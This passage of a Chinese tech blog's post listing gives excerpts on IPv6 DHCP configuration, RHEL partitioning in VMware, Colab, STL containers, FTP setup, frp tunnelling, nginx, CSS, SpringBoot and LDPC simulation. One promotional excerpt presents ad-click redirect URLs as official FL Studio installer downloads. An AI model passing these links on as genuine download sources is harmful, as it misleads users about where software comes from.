# ipv6 dhcp pool 3 network 3::/64 # ipv6 dhcp pool 4 network 4::/64 # interface GigabitEthernet2/0 ipv6 dhcp select server ipv6 dhcp server apply pool 3 ipv6 address 3::1/64 ipv6 nd autoconfig managed-address-flag ipv6 nd autoconfig other-flag undo ipv6 nd ra halt # interface GigabitEthernet3/0 ipv6 dhcp select server ipv6 dhcp server apply pool 4 ipv6 address 4::1/64 ipv6 nd autoconfig managed-address-flag ipv6 nd autoconfig other-flag undo ipv6 nd ra halt VSR3
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f07bdd83563aaf39f4004df44970b61/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6405a3579babe2ae72f49a54cea8b4b/" rel="bookmark">
			2024初学编曲免费软件FL Studio21.2.2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FL Studio在业内也被称作“水果”软件，这是一款功能强大、简单易上手的专业编曲软件。软件中的音效插件库拥有超过25种音效插件，能够帮助激发我们的创作灵感。而FL Studio中文还推出了训练营课程，初学者可以在训练营中进行编曲知识的学习，帮助新手快速完成进阶。 FL Studio 21.2.2官方中文版重磅发布纯正简体中文支持，更快捷的音频剪辑及素材管理器，多样主题随心换！Mac版新增对苹果M2/1家族芯片原生支持。
FL Studio 21 Win-安装包下载如下:
https://wm.makeding.com/iclk/?zoneid=55981
FL Studio 21 Mac-安装包下载如下:
https://wm.makeding.com/iclk/?zoneid=55982
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/584764c474c7a4f27b8c96c3eedc15f1/" rel="bookmark">
			VMware安装RHEL-磁盘划分和分区
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文探讨了在VMware虚拟机上安装RHEL时遇到的磁盘划分和分区问题。文章详细介绍了磁盘划分过程中可能出现的问题，特别是在选择磁盘类型时可能导致找不到磁盘的情况。通过清晰的步骤和解决方法，读者可以更好地理解如何正确进行磁盘划分以及如何解决磁盘无法被识别的错误。这对于在VMware环境下顺利安装RHEL系统提供了实用的指导。 一、磁盘划分容量 我们在安装RHEL的过程中会1需要我们去划分磁盘，根据实际需要划分，如果和我一样实在VMWare这种虚拟机里，大概划分20GB就完全够用了。
1、创建虚拟磁盘 选择磁盘类型，将磁盘类型选择为SCSI或者SATA。
选择磁盘时选择：创建新虚拟磁盘 2、分配磁盘容量 这边我给20G的磁盘容量。
二、磁盘分区 我们在首次启动RHEL时会遇到需要选择分区模式的选项，系统为我们提供了标准分区(Standard Partition)、LVM分区两种选择，两种选择的区别在哪里呢，本篇文章将讲述标准分区(Standard Partition)和LVM分区两种不同选择的差异及勾选造成的实际影响。
初始我们选择的硬盘接口是SATA/SCSI，安装的位置是sda。我们可以点击 Click here to create them automatically 来快速创建初始分区。Partitioning scheme 有LVM分区和标准分区(Standard Partition)两种选择，下面我介绍一下两种选择的差异在哪里，以及勾选造成的实际影响。
1、选择标准分区的情况 如果我们选择标准分区，会出现sda1、sda2、sda3三个分区，后面自定义新增的分区是主分区sda4的分裂，sda5、sda6、sda7、sda8…
2、选择LVM分区的情况 选择LVM分区，初始则是sda1、rhel-root、rhel-swap三个分区，其中rhel是我们之前自定义的虚拟机名称，如果再增添新的分区，比如home分区，那新分区目录叫rhel-home，分区的目录会和标准分区不同，LVM分区是从主分区sda2进行分裂，分出新的分区。
无论选择那种分区方法，划分好我们都是点击done，然后 Accept Changes 来完成分区操作。
三、常见问题-分区找不到磁盘 在VMware上安装RHEL时，有时会遇到一个比较普遍的问题：在划分空间时找不到磁盘，报错信息为“NO USABLE DISKS HAVE BEEN FOUND”。这通常是由于在创建新的虚拟机时未正确选择可识别的磁盘类型所致。在遇到这个问题时，我们可以采取重新安装磁盘的方法来解决。下面详细介绍具体的解决方法。
1、问题现象 在进行RHEL安装过程中，出现以下两个问题：一是系统报错 NO USABLE DISKS HAVE BEEN FOUND ；二是在安装界面上确实无法找到可用的磁盘空间，即之前划分的20GB磁盘似乎消失了。
2、问题原因 这是由于我们在之前创建新的虚拟机磁盘时没有选择正确的磁盘类型。这该怎么怎么办呢？没事，有可以改的办法。虚拟机的设置在创建完之后依旧是可以改的。
3、解决方法 ① 关闭虚拟机 在遇到这个问题后，首先需要关闭虚拟机。
② 进入虚拟机设置 右键我们需要做出设置变更的的虚拟机，选择设置，进入设置页面。
③ 查看磁盘设置 在设置页面中，我们可以看到之前创建虚拟机时设置的配置参数。我们可以看到我们之前创建虚拟机时设置的配置参数，我们的磁盘确实分配了20GB，但是我们采用的磁盘类型是SATA。所以我们需要重新分配一个20GB的其他类型的磁盘。
④ 更改磁盘类型 选择之前的磁盘进行移除，然后添加一个新的磁盘。
在添加硬件类型时，选择硬盘，并将磁盘类型选择为SCSI。
⑤ 启动虚拟机 完成磁盘类型更改后，启动虚拟机，这次应该能够找到磁盘了，问题得以解决。
通过以上步骤，我们成功解决了在VMware安装RHEL过程中找不到磁盘的问题。这个方法同样适用于其他虚拟机平台，关键在于选择正确的磁盘类型以确保系统能够正确识别和使用磁盘空间。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26d7de8d413c21d84f5ec43ee03c479b/" rel="bookmark">
			深度学习-搭建Colab环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Google Colab(Colaboratory) 是一个免费的云端环境，旨在帮助开发者和研究人员轻松进行机器学习和数据科学工作。它提供了许多优势，使得编写、执行和共享代码变得更加简单和高效。Colab 在云端提供了预配置的环境，可以直接开始编写代码，并且提供了免费的 GPU 和 TPU 资源，这对于训练深度学习模型等计算密集型任务非常有帮助，可以加速模型训练过程。
一、Colab网站介绍 Google Colab(Colaboratory) 是一个免费的云端环境，旨在帮助开发者和研究人员轻松进行机器学习和数据科学工作。可以在Colab官网上直接新建代码文件并运行，Colab 在云端提供了预配置的Python环境，免费的GPU和TPU资源，这有助于加速计算密集型任务，如深度学习模型的训练。
二、Colab分配GPU/CPU/TPU 点击右上角分配，分配服务器资源。
输入 Python 代码：
!nvidia-smi 可以查看被分配的详细配置：
三、常用的指令和技巧 代码执行： 在单元格中编写代码可以按 Shift+Enter 执行，能够执行 Python 代码，查看输出和绘图等。
新建单元格： 在工具栏中点击 + 图标或使用快捷键 Ctrl+M B（在命令模式下）添加新单元格。
运行所有单元格： 在工具栏中点击 "运行时"，选择”全部运行”来运行所有单元格。
运行选定单元格： 选定单元格后，点击工具栏中的播放按钮或使用快捷键Shift+Enter来运行选中的单元格。
切换单元格类型： 将单元格切换为代码单元格或 Markdown 单元格，可使用快捷键 Ctrl+M Y（切换到代码）和 Ctrl+M M（切换到 Markdown）。
保存和导出： 使用文件菜单中的保存或下载选项，可以将笔记本保存在 Google 云端硬盘或导出为 .ipynb 文件。
挂载 Google Drive： 使用以下代码挂载 Google Drive，以便访问云端存储的数据。
from google.colab import drive drive.mount('/content/drive') 安装库： 使用pip命令安装所需的Python库。
!pip install library_name 查看文件列表： 使用以下命令查看当前目录下的文件列表。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26d7de8d413c21d84f5ec43ee03c479b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84a80a52bb38969d8ae3b183db8edb8b/" rel="bookmark">
			STL容器大总结区分(上)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如图所示 ,按大小说明其重要性
那就先说两个最重要的:
vector---数组 list-----链表
vector 基本概念 功能： vector 数据结构和 数组非常 相似 ，也称为 单端数组 vector 与普通数组区别： 不同之处在于数组是静态空间，而 vector 可以 动态扩展 动态扩展： 并不是在原空间之后续接新空间，而是找更大的内存空间 ，然后将原数据 拷贝 新空间，释放原空间 vector 容器的迭代器是支持 随机访问 的迭代器 list 链表 有数据域和指针域
优点 1可以对任意位置进行快速插入和删除元素 2动态分配存储 缺点 容器遍历速度慢，因为要通过指针域来找元素,比数组慢。占用的空间也比数组大,因为有数据域和指针域。
STL中的链表是一个双向循环链表
支持头部和尾部的插入删除 链表的存储方式不是连续的内存空间,因此链表list中的迭代器只支持前移和后移,属于双向迭代器 list有一个重要的性质,插入操作和删除操作都不会造成原有list迭代器的失效,这在vector是不成立的
因为,vector如果满了,就会开辟新内存空间,原有迭代器会失效 可以想象vector是一排连接起来的箱子,list是独立的箱子,放哪都不会影响内存
说到这,插入一个知识点 vector 随机访问迭代器deque 随机访问迭代器list 双向迭代器set/multiset 双向迭代器map/multimap 双向迭代器stack 不支持迭代器queue 不支持 好，言归正传
先从构造函数开始讲,这几类的方式都大差不差,包括构造时候和赋值和删除插入时
先从构造时候说 在list和vector都有四种方式构造函数
默认构造 无参构造 还可通过区间的方式进行构造
n个elem方式构造
拷贝构造
实例说明
vector的
void test01(){ vector&lt;int&gt; v1;//默认构造 无参构造 for(int i=0;i&lt;=10;i++){ v1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/84a80a52bb38969d8ae3b183db8edb8b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fa22ab1fd93ad914357d22b93a9c25c/" rel="bookmark">
			FTP主被动模式详解、FTP服务器的搭建及FileZilla的安装使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、FTP主被动模式详解
1.被动模式
2.主动模式
3.主被动模式的区别
二、FTP服务架设
1、环境要求
2、创建用户组
3、创建用户
4、安装FTP服务器 5、配置FTP服务器 6、设置目录权限 7、重启服务器（可选）
三、FTP服务器连接验证 1.本机浏览器验证
2.局域网访问验证
1.设置入站规则
2.设置访问
四、FileZilla的安装及使用 1.什么是FileZilla
2.下载FileZilla
3.安装FileZilla
1. 服务端安装
2.客户端安装 3.FileZilla的使用 1.服务端的使用
1.1服务端的被动模式设置
2.2 设置防火强规则 2.3 配置组
2.4 配置用户
2.服务端的使用 前言： 简单了解下FTP，FTP是什么？
FTP（文件传输协议）是一种用于在网络上进行文件传输的标准协议。通过FTP，用户可以从服务器上下载或上传文件，实现文件的远程访问和共享。
FTP协议可以在多种网络环境下工作，包括局域网、互联网和广域网等。它使用TCP/IP协议作为传输层协议，提供可靠的、面向连接的数据传输服务。
FTP服务器是指运行FTP协议的计算机，通常用于存储和管理文件。客户端是指使用FTP协议进行文件传输的计算机或应用程序。
除了常见的主动模式和被动模式外，FTP还有其他一些功能和特点，例如支持多种数据传输模式（二进制和文本模式）、支持登录验证、支持文件权限和目录结构等。
在实际应用中，FTP通常用于网站的主机服务、文件存储和备份、软件更新、数据迁移等方面。同时，也有一些安全措施可以加强FTP服务器的安全性，例如使用SSL加密通信、设置用户权限和访问控制等。
一、FTP主被动模式详解 FTP协议有两种工作方式：PORT方式和PASV方式，中文意思为主动式和被动式（如果是IPv6，则分别是EPRT和EPSV）。主动被动都是相对于服务器来说的
1.被动模式 FTP默认使用被动模式传输数据，如图所示FTP登录成功后，客户端向服务器发送PASV指令，告诉服务器使用的被动模式。服务器接受指令后，开放一个随机端口（端口大于1024），并将该端口信息回复客户端。客户端接受到服务器传来的端口信息后，建立一条数据链路来传送数据。
2.主动模式 如图所示FTP登录成功后，由客户端开放一个随机端口（端口大于1024）后向服务器发送PORT指令，告诉服务器使用的主动模式。于是服务器从20端口向客户端开放的随机端口发送连接请求，建立一条数据链路来传送数据。
3.主被动模式的区别 由上面的连接图可以得出，二者的区别主要在于建立数据传输连接的时候，主模式的连接发起方为服务器端，使用20号端口连接客户端的端口建立数据连接；被动模式连接发起方为客户端，客户端使用端口号+1去连接服务器的端口建立数据连接；
二、FTP服务架设 本篇以 windows server 2008 为例，操作均在VMware 16 pro 搭建的windows server 2008 环境下完成。
1、环境要求 安装有windows server 2008或者其他服务器版本的window操作系统的机器
2、创建用户组 server 2008对用户组和用户的管理比较严格，而且我们作为一个ftp服务器，肯定涉及到非常多的用户，单独使用用户来管理工作量非常大而且不显示，所以这里我们首先创建一个用户组ftpGroup
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fa22ab1fd93ad914357d22b93a9c25c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe808bac5ebc932b37880d2b4fbc36b8/" rel="bookmark">
			线性表--栈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.什么是栈？ 栈是一种特殊的线性表，其只允许在固定的一端进行插入和删除元素操作。进行数据插入和删除
操作的一端称为栈顶，另一端称为栈底。栈中的数据元素遵守后进先出的原则。
压栈：栈的插入操作叫做进栈/压栈/入栈，入数据在栈顶；
出栈：栈的删除操作叫做出栈。出数据也在栈顶。
后进先出
2.动态栈的实现 栈可以用前面章节介绍的数组或者链表的节点实现，数组相比之下更优越一下，动态开辟内存实现扩容，且在数组尾上插入数据代价较小（链表节点还得创建next指针）。
2.1栈的形式 2.2初始化 2.3入栈 2.4出栈 直接top-1就行，如果后序入栈会直接覆盖，也不影响后续出栈，调用栈顶等操作，因为这些操作都基于top的数值来进行的。
2.5调用栈顶 2.6返回有效数据个数 2.7判断是否为空栈 2.8销毁 3.代码 //Stack.h #pragma once #define _CRT_SECURE_NO_WARNINGS 1 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;assert.h&gt; #include &lt;stdbool.h&gt; typedef int StackDataType; //栈（stack） typedef struct Stack { StackDataType* arr;//数据 int capacity;//容量 int top;//栈顶，top初始化为0，则top为最后一个有效数据的下一位下标；\ top初始化为-1，则为最后一个有效数据下标 }Stack; //初始化 void StackInit(Stack* ps); //销毁 void StackDestroy(Stack* ps); //入栈 void StackPush(Stack* ps, StackDataType x); //出栈 void StackPop(Stack* ps); //调用栈顶 StackDataType StackTop(Stack* ps); //返回个数 int StackSize(Stack* ps); //判断是否为空栈 bool StackEmpty(Stack* ps); //Stack.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fe808bac5ebc932b37880d2b4fbc36b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/beb3df2723a62c8735098616d81bb41d/" rel="bookmark">
			【c&#43;&#43;学习】数据结构中的栈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		c++栈 栈代码用线性表实现栈用链表实现栈 栈 栈：先进后出
只对栈顶元素进行操作，包括新元素入栈、栈顶元素出栈和查看栈顶元素（只支持对栈顶的增、删、查）。
代码 下述代码实现了栈及其接口
包括对栈顶的增、删、查以及查看栈的大小
用线性表实现栈 #include &lt;iostream&gt; using namespace std; template&lt;typename T&gt; class Stack{ private: T *data; int size; int capacity; void resize(); public: Stack() : data(new T[capacity]),size(0),capacity(10){} ~Stack(); void push(T element); T pop(); T top() const; int getSize() const; }; template&lt;typename T&gt; void Stack&lt;T&gt;::resize(){ int newCapacity = 2*capacity; T *newData = new T[newCapacity]; for(int i = 0; i &lt; size; i++){ newData[i] = data[i]; } delete[] data; data = newData; capacity = newCapacity; } template&lt;typename T&gt; Stack&lt;T&gt;::~Stack(){ delete[] data; } template&lt;typename T&gt; void Stack&lt;T&gt;::push(T element){ if(size == capacity){ resize(); } data[size++] = element; } template&lt;typename T&gt; T Stack&lt;T&gt;::pop(){ if(size == 0){ throw std::underflow_error("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/beb3df2723a62c8735098616d81bb41d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad7fc776451065638c288d7f915e10cf/" rel="bookmark">
			基于frp工具实现内网穿透，跨局域网远程SSH登录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一.概述1.1 为什么要内网穿透？1.2 什么是frp？ 二.frp安装管理流程2.1 frp下载2.2 部署2.3 通过systemd系统服务管理启动程序 三.frp配置测试（通过SSH访问内网机器C）3.1 服务端配置文件frps.toml修改3.2 客户端配置文件frpc.toml修改3.3 启动 frps 和 frpc 四 .一切就绪，执行测试五 .补充：测试网络端口工具六.参考链接 一.概述 1.1 为什么要内网穿透？ 如上图，假设我们想要通过主机A访问主机C（通过SSH登录），但是主机A和主机C在不同的局域网中，绑定的都是私有ip地址，所以它们之间是无法直接进行通信的。要想使得A和C能够进行通信，就需要用到内网穿透的技术。使得局域网内的设备C能够被“穿透”到公网中，被其他设备所访问，这就要用到内网穿透技术。
内网穿透是一种网络技术，通常用于将位于局域网内部的服务、设备、或者应用程序暴露到公共网络（互联网）中，使得外部网络可以访问局域网内的资源。比如上图中，我们把公网中的服务器B作为代理桥梁沟通A和C，由于B是公网ip，因此A和C都可以主动访问到B，那么我们就可以在B和C之间建立通信信道，在A需要访问C时，将访问请求发给B，由B作为代理转发给C，这样就实现了A与C之间的通信，也就实现了C的内网穿透。
现在有多种工具可以提供内网穿透服务，如ngrok，花生壳，frp等，本文将介绍通过frp实现内网穿透，简单免费、配置方便。
1.2 什么是frp？ frp 是一款高性能的反向代理应用，专注于内网穿透。它支持多种协议，包括 TCP、UDP、HTTP、HTTPS 等，并且具备 P2P 通信功能。使用 frp，可以安全、便捷地将内网服务暴露到公网，通过拥有公网 IP 的节点进行中转。
通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，并享受以下专业特性：
多种协议支持：客户端服务端通信支持 TCP、QUIC、KCP 和 Websocket 等多种协议。TCP 连接流式复用：在单个连接上承载多个请求，减少连接建立时间，降低请求延迟。代理组间的负载均衡。端口复用：多个服务可以通过同一个服务端端口暴露。P2P 通信：流量不必经过服务器中转，充分利用带宽资源。客户端插件：提供多个原生支持的客户端插件，如静态文件查看、HTTPS/HTTP 协议转换、HTTP、SOCKS5 代理等，以便满足各种需求。服务端插件系统：高度可扩展的服务端插件系统，便于根据自身需求进行功能扩展。用户友好的 UI 页面：提供服务端和客户端的用户界面，使配置和监控变得更加方便。 代理类型： frp 支持多种代理类型，以适应不同的使用场景。以下是一些常见的代理类型：
TCP：提供纯粹的 TCP 端口映射，使服务端能够根据不同的端口将请求路由到不同的内网服务。UDP：提供纯粹的 UDP 端口映射，与 TCP 代理类似，但用于 UDP 流量。HTTP：专为 HTTP 应用设计，支持修改 Host Header 和增加鉴权等额外功能。HTTPS：类似于 HTTP 代理，但专门用于处理 HTTPS 流量。STCP：提供安全的 TCP 内网代理，要求在被访问者和访问者的机器上都部署 frpc，不需要在服务端暴露端口。SUDP：提供安全的 UDP 内网代理，与 STCP 类似，需要在被访问者和访问者的机器上都部署 frpc，不需要在服务端暴露端口。XTCP：点对点内网穿透代理，与 STCP 类似，但流量不需要经过服务器中转。TCPMUX：支持服务端 TCP 端口的多路复用，允许通过同一端口访问不同的内网服务。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ad7fc776451065638c288d7f915e10cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/786b4acde09b1751cc2b61c1e2e00cad/" rel="bookmark">
			UBUNTU中NGINX的负载均衡和环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.准备三台ubuntu版本的虚拟机
2.开始安装，下载，解压，以及编译nginx所需的环境依赖
这里需要注意我们创建了一个新的目录 /home/nginx,所以在编译中记得更改
然后再编译过程中我们会发现提示无法编译，原因是缺少c语言的插件，直接apt-get install gcc下载一个
重新编译还是不行，因为缺少了pcre正则表达库
那就继续安装（sudo apt install libpcre3 libpcre3-dev ）
继续编译，仍旧缺少openssl库
下载安装openless库（sudo apt-get install openssl libssl-dev 执行编译并安装）
到这可以看到完成编译，安装位置在 /home/nginx， (但是未完全编译，真正编译需要用到 make &amp;&amp; make install,此处仍旧缺少make命令，使用apt-get install make 下载关于make的命令，再继续
到这已经完成了百分之70了，ping一下验证之前操作
下来就是选中一个主机更改权重，如果采用一键安装 apt-get install nginx （配置文件在/etc/nginx下，日志文件在/var/log/nginx），手动则不变
可以改改个html试试
然后利用指令 cd /home/syf1/nginx/conf 再 vim nginx.conf 进更改权重
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4465ffd2f78dbcfce860ed179d8f3d53/" rel="bookmark">
			CSS如何设置谷歌浏览器字体小于12px
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种方法 在浏览器的设置中修改，不过只能修改自己的浏览器字体大小，用户的不行
点击设置
找到自定义字体
修改字体大小
第二种方法 使用2D转换
scale()
当我们想设置字体大小为6px的时候
大家要记住，只能在块盒与行块盒中设置，行盒设置不了
p { font-size: 12px; transform: scale(0.5); transform-origin: left center; } 只需做乘法运算即可
感谢大家的阅读，如有不对的地方，可以向我提出，感谢大家！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bcf05b5bfc9b90b4781fcf85e9cfdc1d/" rel="bookmark">
			SpringBoot自定义全局异常处理器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、介绍二、实现1. 定义全局异常处理器2. 自定义异常类 三、使用四、疑问 一、介绍 Springboot框架提供两个注解帮助我们十分方便实现全局异常处理器以及自定义异常。
@ControllerAdvice 或 @RestControllerAdvice（推荐）@ExceptionHandler 二、实现 1. 定义全局异常处理器 定义GlobalExceptionHandler类，拦截所有异常。
@RestControllerAdvice注解使得你可以在GlobalExceptionHandler 中处理异常，@ExceptionHandle注解用于将指定异常绑定到处理的函数上。如下使用@ExceptionHandler(Exception.class)即对所有异常进行捕获处理。
@RestControllerAdvice @Slf4j public class GlobalExceptionHandler { @ExceptionHandler(Exception.class) @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR) public RestErrorResponse exception(Exception e){ //record log log.error("系统异常{}", e.getMessage(),e); //decode errorException String errMessage = "系统异常"; return new RestErrorResponse(errMessage); } } @Data @AllArgsConstructor public class RestErrorResponse implements Serializable { private String errMessage; } 事实上，写到这里已经可以用了，RestErrorResponse 用来承载错误信息到前端，因为@RestControllerAdvice已经包含了@ResponseBody。
2. 自定义异常类 继承RuntimeException 异常类写一个自定义的异常类。这么做主要是能够使用自定义的枚举类来更优雅的抛出错误。
@Data public class XueChengPlusException extends RuntimeException { private String errMessage; public XueChengPlusException() { super(); } public XueChengPlusException(String errMessage) { super(errMessage); this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bcf05b5bfc9b90b4781fcf85e9cfdc1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4a9b8d6ebeb2f6e5a07e1a1a8a7db28/" rel="bookmark">
			m基于码率兼容打孔LDPC码nms最小和译码算法的LDPC编译码matlab误码率仿真
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.算法仿真效果
2.算法涉及理论知识概要
3.MATLAB核心程序
4.完整算法代码文件获得
1.算法仿真效果 matlab2022a仿真结果如下：
2.算法涉及理论知识概要 码率兼容打孔LDPC码BP译码算法是一种改进的LDPC译码算法，能够在不同码率下实现更好的译码性能。该算法通过在LDPC码中引入打孔操作，使得码率可以灵活地调整，同时利用BP（Belief Propagation）译码算法进行迭代译码，提高了译码的准确性和可靠性。
LDPC编码算法基于稀疏矩阵的乘积码，通过奇偶校验位来纠正传输过程中的错误。其核心思想是通过尽可能低的密度奇偶校验位来构造大量的码字，使得每个码字的校验和为0。
设原始信息位长度为k，校验位长度为r，总码字长度为n=k+r。将原始信息位放入一个长度为k的行向量中，将校验位放入一个长度为r的列向量中。然后构建一个(n-k)×n的校验矩阵H，其中每一行是一个奇偶校验位，每一列是一个码字。
为了实现码率兼容，引入打孔操作。打孔操作是指在码字中删除一些校验位，使得总码率在一定范围内可调。具体实现时，可以按照一定规则随机删除一些校验位，或者根据码率要求计算需要删除的校验位数。打孔操作后，可以得到一个新的校验矩阵H'，其中每一行仍是一个奇偶校验位，但每一列可能不再是完整的码字。
归一化最小和（nMS）算法的基本思想是在传递消息时，对最小和算法中计算出的消息值进行归一化处理。归一化的目的是减少由于MS算法中的近似计算造成的性能损失，并试图逼近和积算法的性能。
在nMS算法中，每个变量节点计算其传递给校验节点的消息时，会基于最小和算法找到最小的入度消息（对应于与该变量节点相连的其他校验节点的消息）和次小的入度消息。然后，变量节点会计算出一个初步的消息值，该值等于最小消息值和次小消息值之差。接着，这个初步的消息值会被归一化，即乘以一个归一化因子（通常小于1），然后再传递给相邻的校验节点。
LDPC编码算法的实现步骤如下：
生成随机的(n-k)×n的校验矩阵H；
根据要求进行打孔操作，得到新的校验矩阵H'；
将原始信息位按顺序写入一个长度为k的行向量中；
根据校验矩阵H'计算校验和，得到长度为r'的列向量；
将原始信息位和校验位串联起来，得到长度为n的码字向量；
将码字向量进行比特反转，得到最终的LDPC码字。
最小和译码算法（Min-Sum Algorithm）是LDPC译码的一种简化算法，相较于标准的置信传播（Belief Propagation，BP）算法，具有更低的计算复杂度。
置信传播算法基础
BP算法是LDPC译码的基础算法，通过迭代更新变量节点和校验节点的置信度信息来进行译码。其核心步骤包括初始化、水平步骤（变量节点到校验节点）、垂直步骤（校验节点到变量节点）和判决步骤。
最小和译码算法原理
最小和算法在BP算法的基础上进行了简化，用最小值和次小值的运算代替了BP算法中的对数运算和乘法运算，从而降低了计算复杂度。
3.MATLAB核心程序 % 开始仿真 for ij = 1:length(SNRs) err_sum = 0; err_len = 0; for jk = 1:MTKL [jk,ij] %生成随机的信息位 msgs = randi(2,1,Param.B)-1; %进行代码块分割 cbs_msg = func_cbs(msgs,Param); %编码 [dat_code,dat_puncture] = func_ldpc_encoder(cbs_msg,Param); %进行速率匹配 dat_match = func_rate_match(dat_code,Param); %映射 dat_map = 2*dat_match-1; %通过信道 Rec_data = awgn(dat_map,SNRs(ij)); %计算对数似然比 Sigma = 1/10^((SNRs(ij))/10); llr = -2*Rec_data.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4a9b8d6ebeb2f6e5a07e1a1a8a7db28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/008454d3f7eb747343cf01e20255a8f6/" rel="bookmark">
			m基于码率兼容打孔LDPC码oms最小和译码算法的LDPC编译码matlab误码率仿真
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.算法仿真效果
2.算法涉及理论知识概要
3.MATLAB核心程序
4.完整算法代码文件获得
1.算法仿真效果 matlab2022a仿真结果如下：
2.算法涉及理论知识概要 码率兼容打孔LDPC码BP译码算法是一种改进的LDPC译码算法，能够在不同码率下实现更好的译码性能。该算法通过在LDPC码中引入打孔操作，使得码率可以灵活地调整，同时利用BP（Belief Propagation）译码算法进行迭代译码，提高了译码的准确性和可靠性。
LDPC编码算法基于稀疏矩阵的乘积码，通过奇偶校验位来纠正传输过程中的错误。其核心思想是通过尽可能低的密度奇偶校验位来构造大量的码字，使得每个码字的校验和为0。
设原始信息位长度为k，校验位长度为r，总码字长度为n=k+r。将原始信息位放入一个长度为k的行向量中，将校验位放入一个长度为r的列向量中。然后构建一个(n-k)×n的校验矩阵H，其中每一行是一个奇偶校验位，每一列是一个码字。
为了实现码率兼容，引入打孔操作。打孔操作是指在码字中删除一些校验位，使得总码率在一定范围内可调。具体实现时，可以按照一定规则随机删除一些校验位，或者根据码率要求计算需要删除的校验位数。打孔操作后，可以得到一个新的校验矩阵H'，其中每一行仍是一个奇偶校验位，但每一列可能不再是完整的码字。
偏移最小和（Offset Min-Sum, OMS）算法是MS算法的一个变种，它引入了一个偏移量（offset）来改进MS算法的解码性能，尤其是在高信噪比（SNR）条件下。OMS算法通过调整传递给校验节点的消息，减少了由于MS算法近似计算造成的性能损失。
LDPC编码算法的实现步骤如下：
生成随机的(n-k)×n的校验矩阵H；
根据要求进行打孔操作，得到新的校验矩阵H'；
将原始信息位按顺序写入一个长度为k的行向量中；
根据校验矩阵H'计算校验和，得到长度为r'的列向量；
将原始信息位和校验位串联起来，得到长度为n的码字向量；
将码字向量进行比特反转，得到最终的LDPC码字。
最小和译码算法（Min-Sum Algorithm）是LDPC译码的一种简化算法，相较于标准的置信传播（Belief Propagation，BP）算法，具有更低的计算复杂度。
置信传播算法基础
BP算法是LDPC译码的基础算法，通过迭代更新变量节点和校验节点的置信度信息来进行译码。其核心步骤包括初始化、水平步骤（变量节点到校验节点）、垂直步骤（校验节点到变量节点）和判决步骤。
最小和译码算法原理
最小和算法在BP算法的基础上进行了简化，用最小值和次小值的运算代替了BP算法中的对数运算和乘法运算，从而降低了计算复杂度。
3.MATLAB核心程序 ......................................................................... % 开始仿真 for ij = 1:length(SNRs) err_sum = 0; err_len = 0; for jk = 1:MTKL [jk,ij] %生成随机的信息位 msgs = randi(2,1,Param.B)-1; %进行代码块分割 cbs_msg = func_cbs(msgs,Param); %编码 [dat_code,dat_puncture] = func_ldpc_encoder(cbs_msg,Param); %进行速率匹配 dat_match = func_rate_match(dat_code,Param); %映射 dat_map = 2*dat_match-1; %通过信道 Rec_data = awgn(dat_map,SNRs(ij)); %计算对数似然比 Sigma = 1/10^((SNRs(ij))/10); llr = -2*Rec_data.
	</div>
	<div class="list__footer clearfix">
